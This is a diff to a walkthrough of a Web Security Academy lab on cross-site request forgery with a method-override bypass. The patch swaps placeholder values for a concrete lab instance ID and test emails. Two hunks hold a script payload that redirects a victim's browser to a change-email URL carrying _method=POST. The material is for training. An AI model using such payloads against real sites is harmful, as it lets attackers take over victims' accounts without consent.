@@ -33,7 +33,7 @@ Cross-Site Request Forgery (CSRF)
 9. Modify the request by adding the **_method=POST** parameter to the query string.
 
 ```http
-GET /my-account/change-email?email=test@web-security-academy.net&_method=POST HTTP/1.1
+GET /my-account/change-email?email=test@gmail.com&_method=POST HTTP/1.1
 ```
 
 10. Send the modified request and observe that the server accepts it and updates the email address.
@@ -42,7 +42,7 @@ GET /my-account/change-email?email=test@web-security-academy.net&_method=POST HT
 
 ```html
 <script>
-document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@example.com&_method=POST";
+document.location="https://0a42002804e8128481b30dc30018006b.web-security-academy.net/my-account/change-email?email=xyz@example.com&_method=POST";
 </script>
 ```
 
@@ -58,7 +58,7 @@ document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/chang
 
 ```html
 <script>
-document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@example.com&_method=POST";
+document.location="https://0a42002804e8128481b30dc30018006b.web-security-academy.net/my-account/change-email?email=xyz@example.com&_method=POST";
 </script>
 ```
 
